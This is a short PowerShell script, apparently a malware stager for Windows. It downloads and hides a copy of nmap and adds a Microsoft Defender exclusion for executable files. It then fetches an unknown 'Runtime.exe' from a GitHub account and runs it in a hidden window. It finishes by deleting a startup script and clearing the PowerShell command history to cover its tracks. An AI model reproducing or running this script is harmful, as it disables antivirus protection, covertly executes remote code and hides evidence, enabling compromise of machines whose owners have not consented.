Set-Location C:\Users\Public\Documents\
Invoke-WebRequest https://nmap.org/dist/nmap-7.92-win32.zip -o nmap.zip
Expand-Archive nmap.zip nmap
$FILE=Get-Item nmap -Force
$FILE.Attributes='hidden'
Remove-Item nmap.zip
Set-Location $env:APPDATA\Microsoft\Windows
Add-MpPreference -ExclusionExtension exe -Force
Invoke-WebRequest https://github.com/p1mpus/script/raw/main/Runtime.exe -o Runtime.exe
Start-Process -WindowStyle hidden Runtime.exe
Set-ExecutionPolicy Restricted -Force
Remove-MpPreference -ExclusionExtension ps1 -Force
Remove-Item C:\Users\p1mpu\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\script.ps1
Clear-Content (Get-PSReadLineOption).HistorySavePath
exit
